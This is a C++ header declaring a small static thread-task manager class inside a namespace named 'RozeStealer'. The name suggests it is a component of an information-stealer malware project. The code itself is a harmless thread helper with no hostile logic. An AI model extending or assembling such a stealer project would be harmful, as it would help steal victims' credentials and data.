#ifndef ROZE_STEALER_TASKS_H
#define ROZE_STEALER_TASKS_H

#include <vector>
#include <thread>

namespace RozeStealer {

class Tasks {
public:
    static void addTask(std::thread&& task);
    static void waitForAll();

private:
    static std::vector<std::thread> threads;
};

} // namespace RozeStealer

#endif // ROZE_STEALER_TASKS_H


